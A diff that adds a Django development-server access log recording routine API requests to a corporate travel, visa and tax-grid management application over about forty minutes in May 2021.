@@ -1,0 +1,1044 @@
+INFO|05/May/2021 11:42:08|basehttp|2325|140367955920640|"OPTIONS /get_add/project/ HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:08|basehttp|2325|140367955920640|"POST /get_add/project/ HTTP/1.1" 201 74
+INFO|05/May/2021 11:42:39|basehttp|2325|140367955920640|"POST /get_add/project/ HTTP/1.1" 201 652
+INFO|05/May/2021 11:42:44|basehttp|2325|140367955920640|"OPTIONS /get_projects/?page=1&search=d&org=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:44|basehttp|2325|140367685498624|"OPTIONS /get_projects/?page=1&search=dem&org=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:44|basehttp|2325|140367685498624|"OPTIONS /get_projects/?page=1&search=dem&org=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:44|basehttp|2325|140367685498624|"GET /get_projects/?page=1&search=dem&org=ORG150866 HTTP/1.1" 200 1520
+INFO|05/May/2021 11:42:44|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=d&org=ORG150866 HTTP/1.1" 200 7963
+INFO|05/May/2021 11:42:44|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=dem&org=ORG150866 HTTP/1.1" 200 1520
+INFO|05/May/2021 11:42:44|basehttp|2325|140367955920640|"OPTIONS /get_projects/?page=1&search=demo&org=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:44|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=demo&org=ORG150866 HTTP/1.1" 200 1520
+INFO|05/May/2021 11:42:49|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=dem&org=ORG150866 HTTP/1.1" 200 1520
+INFO|05/May/2021 11:42:49|basehttp|2325|140367955920640|"OPTIONS /get_projects/?page=1&search=de&org=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 11:42:50|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=de&org=ORG150866 HTTP/1.1" 200 7971
+INFO|05/May/2021 11:42:51|basehttp|2325|140367955920640|"GET /get_projects/?page=1&search=d&org=ORG150866 HTTP/1.1" 200 7963
+INFO|05/May/2021 11:42:51|basehttp|2325|140367685498624|"GET /get_projects/?page=1&search=&org=ORG150866 HTTP/1.1" 200 7805
+INFO|05/May/2021 11:42:53|basehttp|2325|140367955920640|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 11:42:53|basehttp|2325|140367661635328|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 11:42:53|basehttp|2325|140367441684224|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 11:42:53|basehttp|2325|140367450076928|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 11:42:53|basehttp|2325|140367441684224|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 11:42:54|basehttp|2325|140367670028032|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 11:42:54|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 11:52:20|basehttp|2325|140367685498624|"GET / HTTP/1.0" 200 40
+INFO|05/May/2021 11:52:41|basehttp|2325|140367670028032|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 11:52:41|basehttp|2325|140367685498624|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 11:52:41|basehttp|2325|140367441684224|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 11:52:45|basehttp|2325|140367685498624|"GET /get_national_id/?organization=ORG150866&country=India HTTP/1.1" 200 1373
+INFO|05/May/2021 11:52:55|basehttp|2325|140367685498624|"POST /get_national_id/ HTTP/1.1" 200 492
+INFO|05/May/2021 11:52:59|basehttp|2325|140367685498624|"GET /get_national_id/?organization=ORG150866&country=India HTTP/1.1" 200 1809
+INFO|05/May/2021 11:54:52|basehttp|2325|140367441684224|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 11:54:52|basehttp|2325|140367685498624|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 11:54:52|basehttp|2325|140367441684224|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 11:55:44|basehttp|2325|140367685498624|"GET /get_national_id/?organization=ORG150866&country=India HTTP/1.1" 200 1809
+INFO|05/May/2021 12:05:54|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:05:54|basehttp|2325|140367441684224|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 12:05:54|basehttp|2325|140367441684224|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:06:38|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:06:38|basehttp|2325|140367441684224|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 12:06:38|basehttp|2325|140367685498624|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:06:57|basehttp|2325|140367685498624|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|05/May/2021 12:06:57|basehttp|2325|140367441684224|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|05/May/2021 12:07:07|basehttp|2325|140367685498624|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:07:07|basehttp|2325|140367441684224|"GET /add_taxgrid/ HTTP/1.1" 200 38757
+INFO|05/May/2021 12:07:07|basehttp|2325|140367670028032|"GET /get_taxgridcountry/ HTTP/1.1" 200 1526
+INFO|05/May/2021 12:07:15|basehttp|2325|140367441684224|"POST /add_taxgrid/ HTTP/1.1" 200 37457
+INFO|05/May/2021 12:08:27|basehttp|2325|140367441684224|"POST /api/custom/login/ HTTP/1.1" 200 463
+INFO|05/May/2021 12:08:27|basehttp|2325|140367441684224|"POST /emoloyeeinfo/ HTTP/1.1" 200 1483
+INFO|05/May/2021 12:08:28|basehttp|2325|140367670028032|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:28|basehttp|2325|140367441684224|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:08:28|basehttp|2325|140367419655936|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:28|basehttp|2325|140367428048640|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 1523
+INFO|05/May/2021 12:08:28|basehttp|2325|140367450076928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 2228
+INFO|05/May/2021 12:08:28|basehttp|2325|140367450076928|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:28|basehttp|2325|140367428048640|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:08:28|basehttp|2325|140367428048640|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:08:28|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:08:46|basehttp|2325|140367685498624|"GET /get_org_count_travel_requests/?org_id=ORG128316 HTTP/1.1" 200 76
+INFO|05/May/2021 12:08:46|basehttp|2325|140367428048640|"GET /get_org_count_visa_requests/?org_id=ORG128316 HTTP/1.1" 200 76
+INFO|05/May/2021 12:08:48|basehttp|2325|140367419655936|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:48|basehttp|2325|140367670028032|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:48|basehttp|2325|140367441684224|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:08:48|basehttp|2325|140367428048640|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 1523
+INFO|05/May/2021 12:08:48|basehttp|2325|140367450076928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 2228
+INFO|05/May/2021 12:08:48|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:08:48|basehttp|2325|140367450076928|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:08:51|basehttp|2325|140367685498624|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:08:51|basehttp|2325|140367428048640|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:08:52|basehttp|2325|140367419655936|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:08:52|basehttp|2325|140367670028032|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:08:52|basehttp|2325|140367450076928|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2658
+INFO|05/May/2021 12:08:52|basehttp|2325|140367441684224|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:08:52|basehttp|2325|140367441684224|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 63
+INFO|05/May/2021 12:08:52|basehttp|2325|140367670028032|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:08:52|basehttp|2325|140367419655936|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:08:52|basehttp|2325|140367450076928|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:08:56|basehttp|2325|140367670028032|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:56|basehttp|2325|140367441684224|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:08:56|basehttp|2325|140367428572928|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:08:56|basehttp|2325|140367419655936|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 1523
+INFO|05/May/2021 12:08:56|basehttp|2325|140367685498624|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 2228
+INFO|05/May/2021 12:08:56|basehttp|2325|140367685498624|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:08:57|basehttp|2325|140367450076928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:08:57|basehttp|2325|140367450076928|"GET /get_org_count_visa_requests/?org_id=ORG128316 HTTP/1.1" 200 76
+INFO|05/May/2021 12:08:58|basehttp|2325|140367450076928|"GET /get_org_count_travel_requests/?org_id=ORG128316 HTTP/1.1" 200 76
+INFO|05/May/2021 12:09:01|basehttp|2325|140367450076928|"GET /add_taxgrid/ HTTP/1.1" 200 38757
+INFO|05/May/2021 12:09:01|basehttp|2325|140367685498624|"GET /get_taxgridcountry/ HTTP/1.1" 200 1526
+INFO|05/May/2021 12:09:01|basehttp|2325|140367419655936|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:09:08|basehttp|2325|140367419655936|"POST /add_taxgrid/ HTTP/1.1" 200 38106
+INFO|05/May/2021 12:09:18|basehttp|2325|140367450076928|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:09:18|basehttp|2325|140367441684224|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:09:19|basehttp|2325|140367411263232|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:09:19|basehttp|2325|140367428572928|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 1523
+INFO|05/May/2021 12:09:19|basehttp|2325|140367685498624|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 2228
+INFO|05/May/2021 12:09:19|basehttp|2325|140367419655936|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:09:19|basehttp|2325|140367685498624|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:10:13|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:10:13|basehttp|2325|140367419655936|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:10:13|basehttp|2325|140367450076928|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:10:13|basehttp|2325|140367428572928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:10:13|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2658
+INFO|05/May/2021 12:10:13|basehttp|2325|140367411263232|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:10:13|basehttp|2325|140367411263232|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 9640
+INFO|05/May/2021 12:10:13|basehttp|2325|140367685498624|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:10:13|basehttp|2325|140367685498624|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:10:13|basehttp|2325|140367411263232|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:10:37|basehttp|2325|140367411263232|"OPTIONS /get_post_approve_travelvisa_request/ HTTP/1.1" 200 0
+INFO|05/May/2021 12:10:42|basehttp|2325|140367411263232|"POST /get_post_approve_travelvisa_request/ HTTP/1.1" 200 59
+INFO|05/May/2021 12:11:17|basehttp|2325|140367411263232|"OPTIONS /count_visa_requests/?assignment_email=MST1&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:11:17|basehttp|2325|140367411263232|"OPTIONS /count_travel_requests/?assignment_email=MST1&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:11:17|basehttp|2325|140367411263232|"GET /count_visa_requests/?assignment_email=MST1&org_id=ORG128316 HTTP/1.1" 200 72
+INFO|05/May/2021 12:11:17|basehttp|2325|140367685498624|"GET /count_travel_requests/?assignment_email=MST1&org_id=ORG128316 HTTP/1.1" 200 66
+INFO|05/May/2021 12:11:30|basehttp|2325|140367685498624|"OPTIONS /org_travel_request/?travel_req_status=5&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:11:30|basehttp|2325|140367411263232|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:11:31|basehttp|2325|140367411263232|"GET /org_travel_request/?travel_req_status=5&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 2262
+INFO|05/May/2021 12:12:08|basehttp|2325|140367411263232|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:12:09|basehttp|2325|140367685498624|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:12:09|basehttp|2325|140367411263232|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:12:09|basehttp|2325|140367428572928|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:12:09|basehttp|2325|140367450076928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:12:09|basehttp|2325|140367419655936|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:12:09|basehttp|2325|140367441684224|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:12:09|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2692
+INFO|05/May/2021 12:12:09|basehttp|2325|140367685498624|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:12:09|basehttp|2325|140367419655936|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:12:09|basehttp|2325|140367441684224|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:12:09|basehttp|2325|140367428572928|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 9640
+INFO|05/May/2021 12:13:22|basehttp|2325|140367419655936|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:13:22|basehttp|2325|140367428572928|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:13:22|basehttp|2325|140367419655936|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:13:22|basehttp|2325|140367685498624|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:13:22|basehttp|2325|140367441684224|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:13:22|basehttp|2325|140367428572928|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2692
+INFO|05/May/2021 12:13:22|basehttp|2325|140367685498624|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:13:22|basehttp|2325|140367428572928|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:13:22|basehttp|2325|140367441684224|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:13:22|basehttp|2325|140367685498624|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:13:22|basehttp|2325|140367419655936|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:13:22|basehttp|2325|140367428572928|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 9640
+INFO|05/May/2021 12:15:42|basehttp|2325|140367428572928|"GET /get_org_count_visa_requests/?org_id=ORG128316 HTTP/1.1" 200 75
+INFO|05/May/2021 12:15:42|basehttp|2325|140367685498624|"GET /get_org_count_travel_requests/?org_id=ORG128316 HTTP/1.1" 200 75
+INFO|05/May/2021 12:15:47|basehttp|2325|140367428572928|"GET /get_taxgridcountry/ HTTP/1.1" 200 1526
+INFO|05/May/2021 12:15:48|basehttp|2325|140367685498624|"GET /add_taxgrid/ HTTP/1.1" 200 76819
+INFO|05/May/2021 12:15:48|basehttp|2325|140367419655936|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:16:20|basehttp|2325|140367419655936|"POST /add_taxgrid/ HTTP/1.1" 200 38106
+INFO|05/May/2021 12:21:36|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:21:36|basehttp|2325|140367419655936|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:21:36|basehttp|2325|140367428572928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:21:36|basehttp|2325|140367450076928|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:21:36|basehttp|2325|140367441684224|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:21:36|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2692
+INFO|05/May/2021 12:21:36|basehttp|2325|140367441684224|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:21:36|basehttp|2325|140367685498624|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:21:49|basehttp|2325|140367441684224|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:21:49|basehttp|2325|140367685498624|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:21:49|basehttp|2325|140367685498624|"GET /get_taxgridcountry/ HTTP/1.1" 200 1526
+INFO|05/May/2021 12:21:49|basehttp|2325|140367441684224|"GET /add_taxgrid/ HTTP/1.1" 200 76819
+INFO|05/May/2021 12:21:49|basehttp|2325|140367450076928|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 12:21:49|basehttp|2325|140367450076928|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 9640
+INFO|05/May/2021 12:21:49|basehttp|2325|140367441684224|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:21:49|basehttp|2325|140367450076928|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:21:49|basehttp|2325|140367685498624|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:22:16|basehttp|2325|140367685498624|"POST /add_taxgrid/ HTTP/1.1" 200 38023
+INFO|05/May/2021 12:22:41|basehttp|2325|140367450076928|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:22:41|basehttp|2325|140367685498624|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:22:41|basehttp|2325|140367450076928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:22:41|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:22:41|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:22:41|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 2692
+INFO|05/May/2021 12:22:41|basehttp|2325|140367410738944|"GET /assignment_travel_request_status/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 48
+INFO|05/May/2021 12:22:42|basehttp|2325|140367419131648|"GET /get_travel_status_summary/?travel_req_id=TR269636&org_id=ORG128316 HTTP/1.1" 200 956
+INFO|05/May/2021 12:22:42|basehttp|2325|140367685498624|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-07-31T05:30:00+05:30&Start_date=Wed%20May%2005%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=MST2 HTTP/1.1" 200 63
+INFO|05/May/2021 12:22:42|basehttp|2325|140367410738944|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG128316 HTTP/1.1" 200 803
+INFO|05/May/2021 12:22:42|basehttp|2325|140367428572928|"GET /get_currency_conversion/?from_currency=GBP&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:22:42|basehttp|2325|140367419131648|"GET /active_taxgrid/?org=ORG128316 HTTP/1.1" 200 9620
+INFO|05/May/2021 12:22:57|basehttp|2325|140367419131648|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 12:22:58|basehttp|2325|140367419131648|"POST /emoloyeeinfo/ HTTP/1.1" 200 1526
+INFO|05/May/2021 12:22:58|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:22:58|basehttp|2325|140367419131648|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 12:22:58|basehttp|2325|140367410738944|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 12:22:58|basehttp|2325|140367450076928|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:22:58|basehttp|2325|140367450076928|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:22:58|basehttp|2325|140367450076928|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 12:22:58|basehttp|2325|140367410738944|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 12:22:59|basehttp|2325|140367685498624|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 12:22:59|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:23:01|basehttp|2325|140367428572928|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|05/May/2021 12:23:01|basehttp|2325|140367685498624|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|05/May/2021 12:23:03|basehttp|2325|140367450076928|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:23:03|basehttp|2325|140367419918080|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 12:23:03|basehttp|2325|140367441684224|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:23:03|basehttp|2325|140367410738944|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 12:23:03|basehttp|2325|140367441684224|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 12:23:04|basehttp|2325|140367428572928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 12:23:04|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:23:06|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:23:06|basehttp|2325|140367410738944|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 12:23:06|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 12:23:06|basehttp|2325|140367450076928|"GET /assignment_travel_request_status/?travel_req_id=TR211341&org_id=ORG150866 HTTP/1.1" 200 1449
+INFO|05/May/2021 12:23:06|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR211341&org_id=ORG150866 HTTP/1.1" 200 2732
